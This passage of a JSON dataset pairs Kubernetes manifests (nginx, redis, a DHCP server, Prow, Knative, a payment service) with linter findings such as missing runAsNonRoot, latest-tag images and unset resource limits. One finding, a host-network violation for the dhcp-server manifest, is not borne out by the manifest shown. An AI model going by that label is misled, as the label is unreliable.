[
  {
    "id": "1682",
    "manifest_path": "data/manifests/the_stack_sample/sample_0323.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "1683",
    "manifest_path": "data/manifests/the_stack_sample/sample_0323.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "1684",
    "manifest_path": "data/manifests/the_stack_sample/sample_0324.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: component-repository-service\n  namespace: oih-dev-ns\n  labels:\n    app: component-repository-service\nspec:\n  type: NodePort\n  selector:\n    app: component-repository\n  ports:\n  - name: '1234'\n    protocol: TCP\n    port: 1234\n    targetPort: 1234\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:component-repository])"
  },
  {
    "id": "1685",
    "manifest_path": "data/manifests/the_stack_sample/sample_0329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cidotnet-pod\" is using an invalid container image, \"markaw/cidotnet-app\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1686",
    "manifest_path": "data/manifests/the_stack_sample/sample_0329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cidotnet-pod\" does not have a read-only root file system"
  },
  {
    "id": "1687",
    "manifest_path": "data/manifests/the_stack_sample/sample_0329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cidotnet-pod\" is not set to runAsNonRoot"
  },
  {
    "id": "1688",
    "manifest_path": "data/manifests/the_stack_sample/sample_0329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cidotnet-pod\" has cpu request 0"
  },
  {
    "id": "1689",
    "manifest_path": "data/manifests/the_stack_sample/sample_0329.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cidotnet-rc\nspec:\n  replicas: 1\n  selector:\n    app: cidotnet-app\n  template:\n    metadata:\n      labels:\n        app: cidotnet-app\n    spec:\n      containers:\n      - name: cidotnet-pod\n        image: markaw/cidotnet-app\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cidotnet-pod\" has memory limit 0"
  },
  {
    "id": "1690",
    "manifest_path": "data/manifests/the_stack_sample/sample_0330.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: upstream\nspec:\n  selector:\n    matchLabels:\n      app: upstream\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: upstream\n    spec:\n      containers:\n      - name: upstream\n        image: signalrbenchmark/perf:1.4.4\n        resources:\n          requests:\n            cpu: 100m\n            memory: 1024Mi\n          limits:\n            cpu: 150m\n            memory: 1024Mi\n        volumeMounts:\n        - mountPath: /mnt/perf\n          name: volume\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - cp /mnt/perf/manifest/SignalRUpstream/SignalRUpstream.zip /home ; cd /home\n          ; unzip SignalRUpstream.zip ; exec ./SignalRUpstream\n      volumes:\n      - name: volume\n        azureFile:\n          secretName: azure-secret\n          shareName: perf\n          readOnly: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"upstream\" does not have a read-only root file system"
  },
  {
    "id": "1691",
    "manifest_path": "data/manifests/the_stack_sample/sample_0330.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: upstream\nspec:\n  selector:\n    matchLabels:\n      app: upstream\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: upstream\n    spec:\n      containers:\n      - name: upstream\n        image: signalrbenchmark/perf:1.4.4\n        resources:\n          requests:\n            cpu: 100m\n            memory: 1024Mi\n          limits:\n            cpu: 150m\n            memory: 1024Mi\n        volumeMounts:\n        - mountPath: /mnt/perf\n          name: volume\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - cp /mnt/perf/manifest/SignalRUpstream/SignalRUpstream.zip /home ; cd /home\n          ; unzip SignalRUpstream.zip ; exec ./SignalRUpstream\n      volumes:\n      - name: volume\n        azureFile:\n          secretName: azure-secret\n          shareName: perf\n          readOnly: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"upstream\" is not set to runAsNonRoot"
  },
  {
    "id": "1692",
    "manifest_path": "data/manifests/the_stack_sample/sample_0331.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: local-redis\n  labels:\n    deployment: local-redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: local-redis\n  template:\n    metadata:\n      labels:\n        pod: local-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "1693",
    "manifest_path": "data/manifests/the_stack_sample/sample_0331.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: local-redis\n  labels:\n    deployment: local-redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: local-redis\n  template:\n    metadata:\n      labels:\n        pod: local-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "1694",
    "manifest_path": "data/manifests/the_stack_sample/sample_0331.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: local-redis\n  labels:\n    deployment: local-redis\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: local-redis\n  template:\n    metadata:\n      labels:\n        pod: local-redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:alpine\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis\" has memory limit 0"
  },
  {
    "id": "1695",
    "manifest_path": "data/manifests/the_stack_sample/sample_0332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:latest\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources: {}\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "1696",
    "manifest_path": "data/manifests/the_stack_sample/sample_0332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:latest\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources: {}\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"dhcp-server\" is using an invalid container image, \"xunholy/dhcp-server:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1697",
    "manifest_path": "data/manifests/the_stack_sample/sample_0332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:latest\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources: {}\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dhcp-server\" does not have a read-only root file system"
  },
  {
    "id": "1698",
    "manifest_path": "data/manifests/the_stack_sample/sample_0332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:latest\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources: {}\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dhcp-server\" is not set to runAsNonRoot"
  },
  {
    "id": "1699",
    "manifest_path": "data/manifests/the_stack_sample/sample_0332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:latest\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources: {}\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dhcp-server\" has cpu request 0"
  },
  {
    "id": "1700",
    "manifest_path": "data/manifests/the_stack_sample/sample_0332.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:latest\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources: {}\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dhcp-server\" has memory limit 0"
  },
  {
    "id": "1701",
    "manifest_path": "data/manifests/the_stack_sample/sample_0333.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: my-cron-job\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        name: my-cron-job\n        labels:\n          job: my-cron-job\n      spec:\n        containers:\n        - name: my-cron-job\n          image: alpine:3.15.0\n          resources:\n            limits:\n              memory: 16Mi\n              cpu: 10m\n          command:\n          - sh\n          - -c\n          - echo \"doing my job $(date)\"\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"my-cron-job\" does not have a read-only root file system"
  },
  {
    "id": "1702",
    "manifest_path": "data/manifests/the_stack_sample/sample_0333.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: my-cron-job\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        name: my-cron-job\n        labels:\n          job: my-cron-job\n      spec:\n        containers:\n        - name: my-cron-job\n          image: alpine:3.15.0\n          resources:\n            limits:\n              memory: 16Mi\n              cpu: 10m\n          command:\n          - sh\n          - -c\n          - echo \"doing my job $(date)\"\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"my-cron-job\" is not set to runAsNonRoot"
  },
  {
    "id": "1703",
    "manifest_path": "data/manifests/the_stack_sample/sample_0333.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: my-cron-job\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        name: my-cron-job\n        labels:\n          job: my-cron-job\n      spec:\n        containers:\n        - name: my-cron-job\n          image: alpine:3.15.0\n          resources:\n            limits:\n              memory: 16Mi\n              cpu: 10m\n          command:\n          - sh\n          - -c\n          - echo \"doing my job $(date)\"\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"my-cron-job\" has cpu request 0"
  },
  {
    "id": "1704",
    "manifest_path": "data/manifests/the_stack_sample/sample_0335.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20211108-892eb8add1\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"horologium\" not found"
  },
  {
    "id": "1705",
    "manifest_path": "data/manifests/the_stack_sample/sample_0335.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20211108-892eb8add1\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"horologium\" is not set to runAsNonRoot"
  },
  {
    "id": "1706",
    "manifest_path": "data/manifests/the_stack_sample/sample_0335.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20211108-892eb8add1\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"horologium\" has cpu request 0"
  },
  {
    "id": "1707",
    "manifest_path": "data/manifests/the_stack_sample/sample_0335.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20211108-892eb8add1\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"horologium\" has memory limit 0"
  },
  {
    "id": "1708",
    "manifest_path": "data/manifests/the_stack_sample/sample_0337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook\n      role: webhook\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: webhook\n        role: webhook\n        serving.knative.dev/release: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: webhook\n        image: knative.dev/serving/cmd/webhook\n        ports:\n        - name: metrics-port\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/serving\n        securityContext:\n          allowPrivilegeEscalation: false\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"webhook\" is using an invalid container image, \"knative.dev/serving/cmd/webhook\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1709",
    "manifest_path": "data/manifests/the_stack_sample/sample_0337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook\n      role: webhook\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: webhook\n        role: webhook\n        serving.knative.dev/release: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: webhook\n        image: knative.dev/serving/cmd/webhook\n        ports:\n        - name: metrics-port\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/serving\n        securityContext:\n          allowPrivilegeEscalation: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"webhook\" does not have a read-only root file system"
  },
  {
    "id": "1710",
    "manifest_path": "data/manifests/the_stack_sample/sample_0337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook\n      role: webhook\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: webhook\n        role: webhook\n        serving.knative.dev/release: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: webhook\n        image: knative.dev/serving/cmd/webhook\n        ports:\n        - name: metrics-port\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/serving\n        securityContext:\n          allowPrivilegeEscalation: false\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"controller\" not found"
  },
  {
    "id": "1711",
    "manifest_path": "data/manifests/the_stack_sample/sample_0337.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook\n      role: webhook\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: webhook\n        role: webhook\n        serving.knative.dev/release: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: webhook\n        image: knative.dev/serving/cmd/webhook\n        ports:\n        - name: metrics-port\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/serving\n        securityContext:\n          allowPrivilegeEscalation: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"webhook\" is not set to runAsNonRoot"
  },
  {
    "id": "1712",
    "manifest_path": "data/manifests/the_stack_sample/sample_0338.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "1713",
    "manifest_path": "data/manifests/the_stack_sample/sample_0338.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "1714",
    "manifest_path": "data/manifests/the_stack_sample/sample_0338.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "1715",
    "manifest_path": "data/manifests/the_stack_sample/sample_0338.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "1716",
    "manifest_path": "data/manifests/the_stack_sample/sample_0338.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "1717",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
